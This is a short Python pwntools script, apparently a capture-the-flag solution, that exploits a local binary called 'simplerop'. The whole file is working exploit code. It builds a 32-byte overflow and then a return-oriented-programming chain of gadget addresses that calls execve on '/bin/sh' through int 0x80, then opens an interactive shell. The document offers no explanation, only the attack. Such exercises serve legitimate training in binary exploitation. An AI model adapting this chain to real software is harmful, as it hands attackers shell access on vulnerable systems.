#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
context.log_level = 'debug'
io = process("./simplerop")
elf = ELF("./simplerop")

eax_ret = 0x80bae06
edx_ecx_ebx_ret = 0x806e850
sh = 0x080c1a9d
int_0x80 = 0x80493e1

#payload =flat(['a' * 32, eax_ret, 0xb, edx_ecx_ebx_ret, 0, 0, sh, int_0x80])
payload = 'a' * 32
payload += p32(eax_ret) + p32(0xb)
payload += p32(edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(sh)
payload += p32(int_0x80)

io.recvuntil("input :")
io.sendline(payload)
io.interactive()
io.close()
